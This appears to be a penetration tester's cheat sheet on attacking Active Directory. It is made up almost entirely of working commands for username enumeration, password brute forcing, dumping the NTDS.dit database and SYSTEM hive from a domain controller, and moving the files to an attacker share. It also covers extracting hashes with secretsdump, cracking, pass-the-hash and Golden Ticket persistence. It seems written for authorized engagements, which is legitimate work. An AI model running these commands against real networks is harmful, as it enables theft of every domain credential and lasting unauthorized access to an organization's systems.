# Attacking AD & NTDS.dit

## User Enum & Brute Force

Generate username variants from a name list:

```bash
./username-anarchy -i <NAMES_FILE>
```

Validate usernames against the DC via Kerberos before spraying:

```bash
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> <USERLIST>
```

Brute force a single valid account — know the lockout policy first:

```bash
netexec smb <DC_IP> -u <USER> -p <WORDLIST>
```

## NTDS.dit Dump

Got DA creds → fastest path is netexec one-liner (VSS + ntdsutil, auto-cleans remote files):

```bash
netexec smb <DC_IP> -u <USER> -p <PASS> -M ntdsutil
```

Manual path — connect, VSS the C: drive, copy out:

```bash
evil-winrm -i <DC_IP> -u <USER> -p '<PASS>'
```

```powershell
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\<LHOST>\CompData
```

Need SYSTEM too — grab it from the DC before exfil:

```powershell
reg.exe save hklm\system C:\NTDS\SYSTEM
```

Dump offline — same secretsdump pipeline as SAM:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Crack NT hashes (mode 1000) or PTH directly — no need to crack if you just need access:

```bash
hashcat -m 1000 <HASH_FILE> <WORDLIST>
evil-winrm -i <TARGET> -u <USER> -H <NTHASH>
```

> [!tip] `grep -iv disabled <NTDS_DUMP> | cut -d ':' -f1` — filter disabled accounts before reporting crack stats to client. netexec prints this hint automatically after the ntdsutil dump.

> [!warning] NTDS dump = every domain hash. Crack or PTH Administrator and krbtgt first. krbtgt hash → Golden Ticket persistence.